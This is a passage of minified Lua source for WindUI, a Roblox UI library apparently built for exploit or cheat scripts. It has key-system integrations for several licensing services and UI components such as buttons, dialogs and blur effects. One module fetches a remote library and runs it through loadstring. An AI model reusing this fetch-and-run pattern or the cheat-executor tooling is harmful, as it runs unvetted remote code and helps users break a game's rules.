return false
end
else
if ak(aA.message,1,27)=="unique constraint violation"then
ae"you already have an active key, please wait for it to expire before redeeming it.";
return false
else
ae(aA.message);
return false
end
end
elseif az.StatusCode==429 then
ae"you are being rate limited, please wait 20 seconds and try again.";
return false
else
ae"server returned an invalid status code, please try again later.";
return false
end
end


local aw=function(aw)
if af==true then
return false,("A request is already being sent, please slow down.")
else
af=true;
end

local ax=at();
local ay=ar.."/public/whitelist/"..aj(ab).."?identifier="..W(ao()).."&key="..aw;

if ad then
ay=ay.."&nonce="..ax;
end

local az=ah{
Url=ay,
Method="GET",
};

af=false;

if az.StatusCode==200 then
local aA=V(az.Body);

if aA.success==true then
if aA.data.valid==true then
if ad then
if aA.data.hash==W("true".."-"..ax.."-"..ac)then
return true,""
else
return false,("failed to verify integrity.")
end
else
return true
end
else
if ak(aw,1,4)=="KEY_"then
return true,av(aw)
else
return false,("Key is invalid.")
end
end
else
return false,(aA.message)
end
elseif az.StatusCode==429 then
return false,("You are being rate limited, please wait 20 seconds and try again.")
else
return false,("Server returned an invalid status code, please try again later.")
end
end


local ax=function(ax)
local ay=at();
local az=ar.."/public/flag/"..aj(ab).."?name="..ax;

if ad then
az=az.."&nonce="..ay;
end

local aA=ah{
Url=az,
Method="GET",
};

if aA.StatusCode==200 then
local aB=V(aA.Body);

if aB.success==true then
if ad then
if aB.data.hash==W(aj(aB.data.value).."-"..ay.."-"..ac)then
return aB.data.value
else
ae"failed to verify integrity.";
return nil
end
else
return aB.data.value
end
else
ae(aB.message);
return nil
end
else
return nil
end
end


return{
Verify=aw,
GetFlag=ax,
Copy=au,
}
end


return X end function a.h()






local aa=(cloneref or clonereference or function(aa)
return aa
end)

local ab=aa(game:GetService"HttpService")
local ac={}

function ac.New(ad)
local ae=gethwid or function()
return aa(game:GetService"Players").LocalPlayer.UserId
end
local af,ag=request or http_request or syn_request,setclipboard or toclipboard

function ValidateKey(ah)
local ai="https://api.pandauth.com/api/v1/keys/validate"

local aj={
ServiceID=ad,
HWID=tostring(ae()),
Key=tostring(ah),
}

local ak=ab:JSONEncode(aj)
local al,am=pcall(function()
return af{
Url=ai,
Method="POST",
Headers={
["User-Agent"]="Roblox/Exploit",
["Content-Type"]="application/json",
},
Body=ak,
}
end)

if al and am then
if am.Success then
local an,ao=pcall(function()
return ab:JSONDecode(am.Body)
end)

if an and ao then
if ao.Authenticated_Status and ao.Authenticated_Status=="Success"then
return true,"Authenticated"
else
local ap=ao.Note or"Unknown reason"
return false,"Authentication failed: "..ap
end
else
return false,"JSON decode error"
end
else
warn(
" HTTP request was not successful. Code: "
..tostring(am.StatusCode)
.." Message: "
..am.StatusMessage
)
return false,"HTTP request failed: "..am.StatusMessage
end
else
return false,"Request pcall error"
end
end

function GetKeyLink()
return"https://new.pandadevelopment.net/getkey/"..tostring(ad).."?hwid="..tostring(ae())
end

function CopyLink()
return ag(GetKeyLink())
end

return{
Verify=ValidateKey,
Copy=CopyLink,
}
end

return ac end function a.i()







local aa={}

function aa.New(ab,ac)
local ad="https://sdkapi-public.luarmor.net/library.lua"

local ae=loadstring(game.HttpGet and game:HttpGet(ad)or HttpService:GetAsync(ad))()
local af=setclipboard or toclipboard

ae.script_id=ab

function ValidateKey(ag)
local ah=ae.check_key(ag)


if ah.code=="KEY_VALID"then
return true,"Whitelisted!"
elseif ah.code=="KEY_HWID_LOCKED"then
return false,"Key linked to a different HWID. Please reset it using our bot"
elseif ah.code=="KEY_INCORRECT"then
return false,"Key is wrong or deleted!"
else
return false,"Key check failed:"..ah.message.." Code: "..ah.code
end
end

function CopyLink()
af(tostring(ac))
end

return{
Verify=ValidateKey,
Copy=CopyLink,
}
end

return aa end function a.j()









local aa={}

function aa.New(ab,ac,ad)
JunkieProtected.API_KEY=ac
JunkieProtected.PROVIDER=ad
JunkieProtected.SERVICE_ID=ab

local function ValidateKey(ae)
if not ae or ae==""then
print"No key provided!"

return false,"No key provided. Please get a key."
end

local af=JunkieProtected.IsKeylessMode()
if af and af.keyless_mode then
print"Keyless mode enabled. Starting script..."
return true,"Keyless mode enabled. Starting script..."
end

local ag=JunkieProtected.ValidateKey{Key=ae}
if ag=="valid"then
print"Key is valid! Starting script..."
load()
if _G.JD_IsPremium then
print"Premium user detected!"
else
print"Standard user"
end

return true,"Key is valid!"
else
local ah=JunkieProtected.GetKeyLink()
print"Invalid key!"

return false,"Invalid key. Get one from:"..ah
end
end

local function copyLink()
local ae=JunkieProtected.GetKeyLink()

if setclipboard then
setclipboard(ae)
end
end
return{
Verify=ValidateKey,
Copy=copyLink
}
end

return aa end function a.k()



return{
platoboost={
Name="Platoboost",
Icon="rbxassetid://75920162824531",
Args={"ServiceId","Secret"},

New=a.load'g'.New
},
pandadevelopment={
Name="Panda Development",
Icon="panda",
Args={"ServiceId"},

New=a.load'h'.New
},
luarmor={
Name="Luarmor",
Icon="rbxassetid://130918283130165",
Args={"ScriptId","Discord"},

New=a.load'i'.New
},
junkiedevelopment={
Name="Junkie Development",
Icon="rbxassetid://106310347705078",
Args={"ServiceId","ApiKey","Provider"},

New=a.load'j'.New
},


}end function a.l()



return[[
{
    "name": "windui",
    "version": "1.6.65",
    "main": "./dist/main.lua",
    "repository": "https://github.com/Footagesus/WindUI",
    "discord": "https://discord.gg/ftgs-development-hub-1300692552005189632",
    "author": "Footagesus",
    "description": "Roblox UI Library for scripts",
    "license": "MIT",
    "scripts": {
        "dev": "bash build/build.sh dev $INPUT_FILE",
        "build": "bash build/build.sh build $INPUT_FILE",
        "live": "python3 -m http.server 8642",
        "watch": "chokidar . -i 'node_modules' -i 'dist' -i 'build' -c 'npm run dev --'",
        "live-build": "concurrently \"npm run live\" \"npm run watch --\"",
        "example-live-build": "INPUT_FILE=main_example.lua npm run live-build",
        "updater": "python3 updater/main.py"
    },
    "keywords": [
        "ui-library",
        "ui-design",
        "script",
        "script-hub",
        "exploiting"
    ],
    "devDependencies": {
        "chokidar-cli": "^3.0.0",
        "concurrently": "^9.2.0"
    }
}
]]end function a.m()

local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween

function aa.New(ae,af,ag,ah,ai,aj,ak,al)
ah=ah or"Primary"
local am=al or(not ak and 10 or 999)
local an
if af and af~=""then
an=ac("ImageLabel",{
Image=ab.Icon(af)[1],
ImageRectSize=ab.Icon(af)[2].ImageRectSize,
ImageRectOffset=ab.Icon(af)[2].ImageRectPosition,
Size=UDim2.new(0,21,0,21),
BackgroundTransparency=1,
ImageColor3=ah=="White"and Color3.new(0,0,0)or nil,
ImageTransparency=ah=="White"and 0.4 or 0,
ThemeTag={
ImageColor3=ah~="White"and"Icon"or nil,
},
})
end

local ao=ac("TextButton",{
Size=UDim2.new(0,0,1,0),
AutomaticSize="X",
Parent=ai,
BackgroundTransparency=1,
},{
ab.NewRoundFrame(am,"Squircle",{
ThemeTag={
ImageColor3=ah~="White"and"Button"or nil,
},
ImageColor3=ah=="White"and Color3.new(1,1,1)or nil,
Size=UDim2.new(1,0,1,0),
Name="Squircle",
ImageTransparency=ah=="Primary"and 0 or ah=="White"and 0 or 0.9,
}),

ab.NewRoundFrame(am,"Squircle",{



ImageColor3=Color3.new(1,1,1),
Size=UDim2.new(1,0,1,0),
Name="Special",
ImageTransparency=ah=="Secondary"and 0.95 or 1,
}),

ab.NewRoundFrame(am,"Shadow-sm",{



ImageColor3=Color3.new(0,0,0),
Size=UDim2.new(1,3,1,3),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Shadow",

ImageTransparency=1,
Visible=not ak,
}),

ab.NewRoundFrame(am,"SquircleGlass",{
ThemeTag={
ImageColor3="White",
},
Size=UDim2.new(1,1,1,1),

ImageTransparency=0.9,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Name="Outline",
},{













}),

ab.NewRoundFrame(am,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="Frame",
ThemeTag={
ImageColor3=ah~="White"and"Text"or nil,
},
ImageColor3=ah=="White"and Color3.new(0,0,0)or nil,
ImageTransparency=1,
},{
ac("UIPadding",{
PaddingLeft=UDim.new(0,16),
PaddingRight=UDim.new(0,16),
}),
ac("UIListLayout",{
FillDirection="Horizontal",
Padding=UDim.new(0,8),
VerticalAlignment="Center",
HorizontalAlignment="Center",
}),
an,
ac("TextLabel",{
BackgroundTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.SemiBold),
Text=ae or"Button",
ThemeTag={
TextColor3=(ah~="Primary"and ah~="White")and"Text",
},
TextColor3=ah=="Primary"and Color3.new(1,1,1)
or ah=="White"and Color3.new(0,0,0)
or nil,
AutomaticSize="XY",
TextSize=18,
}),
}),
})

ab.AddSignal(ao.MouseEnter,function()
ad(ao.Frame,0.047,{ImageTransparency=0.95}):Play()
end)
ab.AddSignal(ao.MouseLeave,function()
ad(ao.Frame,0.047,{ImageTransparency=1}):Play()
end)
ab.AddSignal(ao.MouseButton1Click,function()
if aj then
aj:Close()()
end
if ag then
ab.SafeCallback(ag)
end
end)

return ao
end

return aa end function a.n()

local aa={}

local ab=a.load'd'
local ac=ab.New local ad=
ab.Tween

function aa.New(ae,af,ag,ah,ai,aj,ak,al,am)
ah=ah or"Input"
local an=ak or 10
local ao
if af and af~=""then
ao=ac("ImageLabel",{
Image=ab.Icon(af)[1],
ImageRectSize=ab.Icon(af)[2].ImageRectSize,
ImageRectOffset=ab.Icon(af)[2].ImageRectPosition,
Size=UDim2.new(0,21,0,21),
BackgroundTransparency=1,
ThemeTag={
ImageColor3="Icon",
},
})
end

local ap=ah=="Textarea"

local aq=ac("TextBox",{
BackgroundTransparency=1,
TextSize=17,
FontFace=Font.new(ab.Font,Enum.FontWeight.Regular),
Size=UDim2.new(1,ao and-29 or 0,1,0),
PlaceholderText=ae,
ClearTextOnFocus=al or false,
ClipsDescendants=true,
TextWrapped=ap,
MultiLine=ap,
TextXAlignment="Left",
TextYAlignment=ah~="Textarea"and"Center"or"Top",

ThemeTag={
PlaceholderColor3="PlaceholderText",
TextColor3="Text",
},
})

local ar=ac("Frame",{
Size=UDim2.new(1,0,0,42),
Parent=ag,
BackgroundTransparency=1,
},{
ac("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ab.NewRoundFrame(an,"Squircle",{
ThemeTag={
ImageColor3="Placeholder",
},
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.85,
}),
not am and ab.NewRoundFrame(an-1,"SquircleGlass",{
ThemeTag={
ImageColor3="Outline",
},
Size=UDim2.new(1,1,1,1),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
ImageTransparency=0.8,
})or nil,
ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="Frame",
ThemeTag={
ImageColor3="LabelBackground",
ImageTransparency="LabelBackgroundTransparency",
},


},{
ac("UIPadding",{
PaddingTop=UDim.new(0,ah~="Textarea"and 0 or 12),
PaddingLeft=UDim.new(0,12),
PaddingRight=UDim.new(0,12),
PaddingBottom=UDim.new(0,ah~="Textarea"and 0 or 12),
}),
ac("UIListLayout",{
FillDirection="Horizontal",
Padding=UDim.new(0,8),
VerticalAlignment=ah~="Textarea"and"Center"or"Top",
HorizontalAlignment="Left",
}),
ao,
aq,
}),
}),
})










if aj then
ab.AddSignal(aq:GetPropertyChangedSignal"Text",function()
if ai then
ab.SafeCallback(ai,aq.Text)
end
end)
else
ab.AddSignal(aq.FocusLost,function()
if ai then
ab.SafeCallback(ai,aq.Text)
end
end)
end

return ar
end

return aa end function a.o()

local aa=a.load'd'
local ab=aa.New
local ac=aa.Tween




local ad={
Holder=nil,

Parent=nil,
}

function ad.Create(ae,af,ag,ah,ai)
local aj={
UICorner=28,
UIPadding=12,

Window=ag,
WindUI=ah,

UIElements={},
}

if ae then
aj.UIPadding=0
end
if ae then
aj.UICorner=26
end

af=af or"Dialog"

if not ae then
aj.UIElements.FullScreen=ab("Frame",{
ZIndex=999,
BackgroundTransparency=1,
BackgroundColor3=Color3.fromHex"#000000",
Size=UDim2.new(1,0,1,0),
Active=false,
Visible=false,
Parent=ad.Parent
or(ag and ag.UIElements and ag.UIElements.Main and ag.UIElements.Main.Main),
},{
ab("UICorner",{
CornerRadius=UDim.new(0,ag.UICorner),
}),
})
end

ab("ImageLabel",{
Image="rbxassetid://8992230677",
ThemeTag={
ImageColor3="WindowShadow",

},
ImageTransparency=1,
Size=UDim2.new(1,100,1,100),
Position=UDim2.new(0,-50,0,-50),
ScaleType="Slice",
SliceCenter=Rect.new(99,99,99,99),
BackgroundTransparency=1,
ZIndex=-999999999999999,
Name="Blur",
})

aj.UIElements.Main=ab("Frame",{
Size=UDim2.new(0,280,0,0),
ThemeTag={
BackgroundColor3=af.."Background",
},
AutomaticSize="Y",
BackgroundTransparency=1,
Visible=false,
ZIndex=99999,
},{
ab("UIPadding",{
PaddingTop=UDim.new(0,aj.UIPadding),
PaddingLeft=UDim.new(0,aj.UIPadding),
PaddingRight=UDim.new(0,aj.UIPadding),
PaddingBottom=UDim.new(0,aj.UIPadding),
}),
})

aj.UIElements.MainContainer=aa.NewRoundFrame(aj.UICorner,"Squircle",{
Visible=false,

ImageTransparency=ae and 0.15 or 0,
Parent=ai or aj.UIElements.FullScreen,
Position=UDim2.new(0.5,0,0.5,0),
AnchorPoint=Vector2.new(0.5,0.5),
AutomaticSize="XY",
ThemeTag={
ImageColor3=af.."Background",
ImageTransparency=af.."BackgroundTransparency",
},
ZIndex=9999,
},{






aj.UIElements.Main,




















})

function aj.Open(ak)
if not ae then
aj.UIElements.FullScreen.Visible=true
aj.UIElements.FullScreen.Active=true
end

task.spawn(function()
aj.UIElements.MainContainer.Visible=true

if not ae then
ac(aj.UIElements.FullScreen,0.1,{BackgroundTransparency=0.65}):Play()
end
ac(aj.UIElements.MainContainer,0.1,{ImageTransparency=0}):Play()


task.spawn(function()
task.wait(0.05)
aj.UIElements.Main.Visible=true
end)
end)
end
function aj.Close(ak)
if not ae then
ac(aj.UIElements.FullScreen,0.1,{BackgroundTransparency=1}):Play()
aj.UIElements.FullScreen.Active=false
task.spawn(function()
task.wait(0.1)
aj.UIElements.FullScreen.Visible=false
end)
end
aj.UIElements.Main.Visible=false

ac(aj.UIElements.MainContainer,0.1,{ImageTransparency=1}):Play()



task.spawn(function()
task.wait(0.1)
if not ae then
aj.UIElements.FullScreen:Destroy()
else
aj.UIElements.MainContainer:Destroy()
end
end)

return function()end
end


return aj
end

return ad end function a.p()

local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween

local ae=a.load'm'.New
local af=a.load'n'.New

function aa.new(ag,ah,ai,aj)
local ak=a.load'o'
local al=ak.Create(true,"Popup",ag.Window,ag.WindUI,ag.WindUI.ScreenGui.KeySystem)

local am={}

local an

local ao=(ag.KeySystem.Thumbnail and ag.KeySystem.Thumbnail.Width)or 200

local ap=430
if ag.KeySystem.Thumbnail and ag.KeySystem.Thumbnail.Image then
ap=430+(ao/2)
end

al.UIElements.Main.AutomaticSize="Y"
al.UIElements.Main.Size=UDim2.new(0,ap,0,0)

local aq

if ag.Icon then
aq=
ab.Image(ag.Icon,ag.Title..":"..ag.Icon,0,"Temp","KeySystem",ag.IconThemed)
aq.Size=UDim2.new(0,24,0,24)
aq.LayoutOrder=-1
end

local ar=ac("TextLabel",{
AutomaticSize="XY",
BackgroundTransparency=1,
Text=ag.KeySystem.Title or ag.Title,
FontFace=Font.new(ab.Font,Enum.FontWeight.SemiBold),
ThemeTag={
TextColor3="Text",
},
TextSize=20,
})

local as=ac("TextLabel",{
AutomaticSize="XY",
BackgroundTransparency=1,
Text="Key System",
AnchorPoint=Vector2.new(1,0.5),
Position=UDim2.new(1,0,0.5,0),
TextTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
ThemeTag={
TextColor3="Text",
},
TextSize=16,
})

local at=ac("Frame",{
BackgroundTransparency=1,
AutomaticSize="XY",
},{
ac("UIListLayout",{
Padding=UDim.new(0,14),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
aq,
ar,
})

local au=ac("Frame",{
AutomaticSize="Y",
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
},{





at,
as,
})

local av=af("Enter Key","key",nil,"Input",function(av)
an=av
end)

local aw
if ag.KeySystem.Note and ag.KeySystem.Note~=""then
aw=ac("TextLabel",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
TextXAlignment="Left",
Text=ag.KeySystem.Note,
TextSize=18,
TextTransparency=0.4,
ThemeTag={
TextColor3="Text",
},
BackgroundTransparency=1,
RichText=true,
TextWrapped=true,
})
end

local ax=ac("Frame",{
Size=UDim2.new(1,0,0,42),
BackgroundTransparency=1,
},{
ac("Frame",{
BackgroundTransparency=1,
AutomaticSize="X",
Size=UDim2.new(0,0,1,0),
},{
ac("UIListLayout",{
Padding=UDim.new(0,9),
FillDirection="Horizontal",
}),
}),
})

local ay
if ag.KeySystem.Thumbnail and ag.KeySystem.Thumbnail.Image then
local az
if ag.KeySystem.Thumbnail.Title then
az=ac("TextLabel",{
Text=ag.KeySystem.Thumbnail.Title,
ThemeTag={
TextColor3="Text",
},
TextSize=18,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
BackgroundTransparency=1,
AutomaticSize="XY",
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
})
end
ay=ac("ImageLabel",{
Image=ag.KeySystem.Thumbnail.Image,
BackgroundTransparency=1,
Size=UDim2.new(0,ao,1,-12),
Position=UDim2.new(0,6,0,6),
Parent=al.UIElements.Main,
ScaleType="Crop",
},{
az,
ac("UICorner",{
CornerRadius=UDim.new(0,20),
}),
})
end

ac("Frame",{

Size=UDim2.new(1,ay and-ao or 0,1,0),
Position=UDim2.new(0,ay and ao or 0,0,0),
BackgroundTransparency=1,
Parent=al.UIElements.Main,
},{
ac("Frame",{

Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
ac("UIListLayout",{
Padding=UDim.new(0,18),
FillDirection="Vertical",
}),
au,
aw,
av,
ax,
ac("UIPadding",{
PaddingTop=UDim.new(0,16),
PaddingLeft=UDim.new(0,16),
PaddingRight=UDim.new(0,16),
PaddingBottom=UDim.new(0,16),
}),
}),
})





local az=ae("Exit","log-out",function()
al:Close()()
end,"Tertiary",ax.Frame)

if ay then
az.Parent=ay
az.Size=UDim2.new(0,0,0,42)
az.Position=UDim2.new(0,10,1,-10)
az.AnchorPoint=Vector2.new(0,1)
end

if ag.KeySystem.URL then
ae("Get key","key",function()
setclipboard(ag.KeySystem.URL)
end,"Secondary",ax.Frame)
end

if ag.KeySystem.API then








local aA=240
local aB=false
local b=ae("Get key","key",nil,"Secondary",ax.Frame)

local d=ab.NewRoundFrame(99,"Squircle",{
Size=UDim2.new(0,1,1,0),
ThemeTag={
ImageColor3="Text",
},
ImageTransparency=0.9,
})

ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(0,0,1,0),
AutomaticSize="X",
Parent=b.Frame,
},{
d,
ac("UIPadding",{
PaddingLeft=UDim.new(0,5),
PaddingRight=UDim.new(0,5),
}),
})

local f=ab.Image("chevron-down","chevron-down",0,"Temp","KeySystem",true)

f.Size=UDim2.new(1,0,1,0)

ac("Frame",{
Size=UDim2.new(0,21,0,21),
Parent=b.Frame,
BackgroundTransparency=1,
},{
f,
})

local g=ab.NewRoundFrame(15,"Squircle",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
ThemeTag={
ImageColor3="Background",
},
},{
ac("UIPadding",{
PaddingTop=UDim.new(0,5),
PaddingLeft=UDim.new(0,5),
PaddingRight=UDim.new(0,5),
PaddingBottom=UDim.new(0,5),
}),
ac("UIListLayout",{
FillDirection="Vertical",
Padding=UDim.new(0,5),
}),
})

local h=ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(0,aA,0,0),
ClipsDescendants=true,
AnchorPoint=Vector2.new(1,0),
Parent=b,
Position=UDim2.new(1,0,1,15),
},{
g,
})

ac("TextLabel",{
Text="Select Service",
BackgroundTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
ThemeTag={TextColor3="Text"},
TextTransparency=0.2,
TextSize=16,
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
TextWrapped=true,
TextXAlignment="Left",
Parent=g,
},{
ac("UIPadding",{
PaddingTop=UDim.new(0,10),
PaddingLeft=UDim.new(0,10),
PaddingRight=UDim.new(0,10),
PaddingBottom=UDim.new(0,10),
}),
})

for i,l in next,ag.KeySystem.API do
local m=ag.WindUI.Services[l.Type]
if m then
local p={}
for r,u in next,m.Args do
table.insert(p,l[u])
end

local r=m.New(table.unpack(p))
r.Type=l.Type
table.insert(am,r)

local u=ab.Image(
l.Icon or m.Icon or Icons[l.Type]or"user",
l.Icon or m.Icon or Icons[l.Type]or"user",
0,
"Temp",
"KeySystem",
true
)
u.Size=UDim2.new(0,24,0,24)

local v=ab.NewRoundFrame(10,"Squircle",{
Size=UDim2.new(1,0,0,0),
ThemeTag={ImageColor3="Text"},
ImageTransparency=1,
Parent=g,
AutomaticSize="Y",
},{
ac("UIListLayout",{
FillDirection="Horizontal",
Padding=UDim.new(0,10),
VerticalAlignment="Center",
}),
u,
ac("UIPadding",{
PaddingTop=UDim.new(0,10),
PaddingLeft=UDim.new(0,10),
PaddingRight=UDim.new(0,10),
PaddingBottom=UDim.new(0,10),
}),
ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,-34,0,0),
AutomaticSize="Y",
},{
ac("UIListLayout",{
FillDirection="Vertical",
Padding=UDim.new(0,5),
HorizontalAlignment="Center",
}),
ac("TextLabel",{
Text=l.Title or m.Name,
BackgroundTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
ThemeTag={TextColor3="Text"},
TextTransparency=0.05,
TextSize=18,
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
TextWrapped=true,
TextXAlignment="Left",
}),
ac("TextLabel",{
Text=l.Desc or"",
BackgroundTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.Regular),
ThemeTag={TextColor3="Text"},
TextTransparency=0.2,
TextSize=16,
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
TextWrapped=true,
Visible=l.Desc and true or false,
TextXAlignment="Left",
}),
}),
},true)

ab.AddSignal(v.MouseEnter,function()
ad(v,0.08,{ImageTransparency=0.95}):Play()
end)
ab.AddSignal(v.InputEnded,function()
ad(v,0.08,{ImageTransparency=1}):Play()
end)
ab.AddSignal(v.MouseButton1Click,function()
r.Copy()
ag.WindUI:Notify{
Title="Key System",
Content="Key link copied to clipboard.",
Image="key",
}
end)
end
end

ab.AddSignal(b.MouseButton1Click,function()
if not aB then
ad(
h,
0.3,
{Size=UDim2.new(0,aA,0,g.AbsoluteSize.Y+1)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ad(f,0.3,{Rotation=180},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
else
ad(
h,
0.25,
{Size=UDim2.new(0,aA,0,0)},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
ad(f,0.25,{Rotation=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end
aB=not aB
end)
end

local function handleSuccess(aA)
al:Close()()
writefile((ag.Folder or"Temp").."/"..ah..".key",tostring(aA))
task.wait(0.4)
ai(true)
end

local aA=ae("Submit","arrow-right",function()
local aA=tostring(an or"empty")local aB=
ag.Folder or ag.Title

if ag.KeySystem.KeyValidator then
local b=ag.KeySystem.KeyValidator(aA)

if b then
if ag.KeySystem.SaveKey then
handleSuccess(aA)
else
al:Close()()
task.wait(0.4)
ai(true)
end
else
ag.WindUI:Notify{
Title="Key System. Error",
Content="Invalid key.",
Icon="triangle-alert",
}
end
elseif not ag.KeySystem.API then
local b=type(ag.KeySystem.Key)=="table"and table.find(ag.KeySystem.Key,aA)
or ag.KeySystem.Key==aA

if b then
if ag.KeySystem.SaveKey then
handleSuccess(aA)
else
al:Close()()
task.wait(0.4)
ai(true)
end
end
else
local b,d
for f,g in next,am do
local h,i=g.Verify(aA)
if h then
b,d=true,i
break
end
d=i
end

if b then
handleSuccess(aA)
else
ag.WindUI:Notify{
Title="Key System. Error",
Content=d,
Icon="triangle-alert",
}
end
end
end,"Primary",ax)

aA.AnchorPoint=Vector2.new(1,0.5)
aA.Position=UDim2.new(1,0,0.5,0)










al:Open()
end

return aa end function a.q()




local aa=(cloneref or clonereference or function(aa)return aa end)


local function map(ab,ac,ad,ae,af)
return(ab-ac)*(af-ae)/(ad-ac)+ae
end

local function viewportPointToWorld(ab,ac)
local ad=aa(game:GetService"Workspace").CurrentCamera:ScreenPointToRay(ab.X,ab.Y)
return ad.Origin+ad.Direction*ac
end

local function getOffset()
local ab=aa(game:GetService"Workspace").CurrentCamera.ViewportSize.Y
return map(ab,0,2560,8,56)
end

return{viewportPointToWorld,getOffset}end function a.r()



local aa=(cloneref or clonereference or function(aa)return aa end)


local ab=a.load'd'
local ac=ab.New


local ad,ae=unpack(a.load'q')
local af=Instance.new("Folder",aa(game:GetService"Workspace").CurrentCamera)


local function createAcrylic()
local ag=ac("Part",{
Name="Body",
Color=Color3.new(0,0,0),
Material=Enum.Material.Glass,
Size=Vector3.new(1,1,0),
Anchored=true,
CanCollide=false,
Locked=true,
CastShadow=false,
Transparency=0.98,
},{
ac("SpecialMesh",{
MeshType=Enum.MeshType.Brick,
Offset=Vector3.new(0,0,-1E-6),
}),
})

return ag
end


local function createAcrylicBlur(ag)
local ah={}

ag=ag or 0.001
local ai={
topLeft=Vector2.new(),
topRight=Vector2.new(),
bottomRight=Vector2.new(),
}
local aj=createAcrylic()
aj.Parent=af

local function updatePositions(ak,al)
ai.topLeft=al
ai.topRight=al+Vector2.new(ak.X,0)
ai.bottomRight=al+ak
end

local function render()
local ak=aa(game:GetService"Workspace").CurrentCamera
if ak then
ak=ak.CFrame
end
local al=ak
if not al then
al=CFrame.new()
end

local am=al
local an=ai.topLeft
local ao=ai.topRight
local ap=ai.bottomRight

local aq=ad(an,ag)
local ar=ad(ao,ag)
local as=ad(ap,ag)

local at=(ar-aq).Magnitude
local au=(ar-as).Magnitude

aj.CFrame=
CFrame.fromMatrix((aq+as)/2,am.XVector,am.YVector,am.ZVector)
aj.Mesh.Scale=Vector3.new(at,au,0)
end

local function onChange(ak)
local al=ae()
local am=ak.AbsoluteSize-Vector2.new(al,al)
local an=ak.AbsolutePosition+Vector2.new(al/2,al/2)

updatePositions(am,an)
task.spawn(render)
end

local function renderOnChange()
local ak=aa(game:GetService"Workspace").CurrentCamera
if not ak then
return
end

table.insert(ah,ak:GetPropertyChangedSignal"CFrame":Connect(render))
table.insert(ah,ak:GetPropertyChangedSignal"ViewportSize":Connect(render))
table.insert(ah,ak:GetPropertyChangedSignal"FieldOfView":Connect(render))
task.spawn(render)
end

aj.Destroying:Connect(function()
for ak,al in ah do
pcall(function()
al:Disconnect()
end)
end
end)

renderOnChange()

return onChange,aj
end

return function(ag)
local ah={}
local ai,aj=createAcrylicBlur(ag)

local ak=ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.fromScale(1,1),
})

ab.AddSignal(ak:GetPropertyChangedSignal"AbsolutePosition",function()
ai(ak)
end)

ab.AddSignal(ak:GetPropertyChangedSignal"AbsoluteSize",function()
ai(ak)
end)

ah.AddParent=function(al)
ab.AddSignal(al:GetPropertyChangedSignal"Visible",function()

end)
end

ah.SetVisibility=function(al)
aj.Transparency=al and 0.98 or 1
end

ah.Frame=ak
ah.Model=aj

return ah
end end function a.s()


local aa=a.load'd'
local ab=a.load'r'

local ac=aa.New

return function(ad)
local ae={}

ae.Frame=ac("Frame",{
Size=UDim2.fromScale(1,1),
BackgroundTransparency=1,
BackgroundColor3=Color3.fromRGB(255,255,255),
BorderSizePixel=0,
},{












ac("UICorner",{
CornerRadius=UDim.new(0,8),
}),

ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.fromScale(1,1),
Name="Background",
ThemeTag={
BackgroundColor3="AcrylicMain",
},
},{
ac("UICorner",{
CornerRadius=UDim.new(0,8),
}),
}),

ac("Frame",{
BackgroundColor3=Color3.fromRGB(255,255,255),
BackgroundTransparency=1,
Size=UDim2.fromScale(1,1),
},{










}),

ac("ImageLabel",{
Image="rbxassetid://9968344105",
ImageTransparency=0.98,
ScaleType=Enum.ScaleType.Tile,
TileSize=UDim2.new(0,128,0,128),
Size=UDim2.fromScale(1,1),
BackgroundTransparency=1,
},{
ac("UICorner",{
CornerRadius=UDim.new(0,8),
}),
}),

ac("ImageLabel",{
Image="rbxassetid://9968344227",
ImageTransparency=0.9,
ScaleType=Enum.ScaleType.Tile,
TileSize=UDim2.new(0,128,0,128),
Size=UDim2.fromScale(1,1),
BackgroundTransparency=1,
ThemeTag={
ImageTransparency="AcrylicNoise",
},
},{
ac("UICorner",{
CornerRadius=UDim.new(0,8),
}),
}),

ac("Frame",{
BackgroundTransparency=1,
Size=UDim2.fromScale(1,1),
ZIndex=2,
},{










}),
})


local af

task.wait()
if ad.UseAcrylic then
af=ab()

af.Frame.Parent=ae.Frame
ae.Model=af.Model
ae.AddParent=af.AddParent
ae.SetVisibility=af.SetVisibility
end

return ae,af
end end function a.t()



local aa=(cloneref or clonereference or function(aa)return aa end)


local ab={
AcrylicBlur=a.load'r',

AcrylicPaint=a.load's',
}

function ab.init()
local ac=Instance.new"DepthOfFieldEffect"
ac.FarIntensity=0
ac.InFocusRadius=0.1
ac.NearIntensity=1

local ad={}

